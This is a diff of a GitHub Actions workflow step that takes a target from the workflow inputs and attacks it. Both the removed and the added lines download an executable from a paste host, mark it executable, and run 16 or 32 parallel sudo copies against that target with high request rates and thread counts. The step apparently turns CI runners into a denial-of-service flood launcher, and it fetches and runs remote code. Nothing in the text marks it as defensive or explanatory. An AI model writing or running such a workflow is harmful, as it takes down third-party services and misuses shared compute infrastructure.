@@ -23,13 +23,12 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/rMn2p/gon.txt
-          wget https://curl.by/cFpDM/killed
-          chmod +x killed
+          wget https://curl.by/bF3LF/raw.js
+          chmod +x raw.js
           
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 250 ./killed "$TARGET" 250 gon.txt --rate 8000 --threads 16 --mobile
+          for i in {1..32}; do
+            sudo timeout 250 node raw.js "$TARGET" 250 64
             PIDS+=($!)
           done
 
